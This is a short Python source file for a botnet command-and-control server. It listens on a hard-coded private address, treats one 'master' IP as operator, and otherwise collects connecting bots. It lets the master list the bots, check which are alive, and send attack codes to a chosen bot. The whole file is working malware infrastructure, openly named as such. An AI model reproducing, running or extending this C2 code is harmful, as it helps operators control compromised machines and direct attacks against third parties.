#!/usr/bin/env python3
import socket
import threading
from time import sleep

class C2server():
    connections = []
    addresses = []
    masterIP = "192.168.1.134"

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("192.168.1.134",7000))
    s.listen()

    def master(self,conn):
        while True:
            data = conn.recv(1024)
            if data == b'l': #LIST
                self.check_conns() #CHECK CONNECTIONS
                for i in self.addresses: #SEND CONNECTIONS
                    for j in i:
                        string = str(j)
                        conn.send(string.encode("utf-8"))
                        sleep(0.01)
                sleep(0.01)
                conn.send(b'q')
            elif data == b'c':
                data = conn.recv(2)
                c = data.decode("utf-8")
                self.send_attack(int(c[0]),c[1])
            elif data == b'':
                break

    def catcher(self):
        while True:
            conn, addr = self.s.accept()
            if addr[0] == self.masterIP: #Check if is it master
                x = threading.Thread(target=self.master, args=(conn,))
                x.start()
            else:
                self.connections.append(conn)
                self.addresses.append(addr)
                print(f"[+] {addr[0]}:{addr[1]} added!") #TEMP

    def check_conns(self):
        for i in self.connections:
            try:
                i.send(b'a')
                sleep(0.1)
                i.send(b'a')
            except:
                index = self.connections.index(i)
                self.addresses.pop(index)
                self.connections.remove(i)

    def send_attack(self,target,attack):
        self.connections[target].send(attack.encode("utf-8"))
            
    def start(self):
        self.catcher()

if __name__ == "__main__":
    server = C2server()
    server.start()
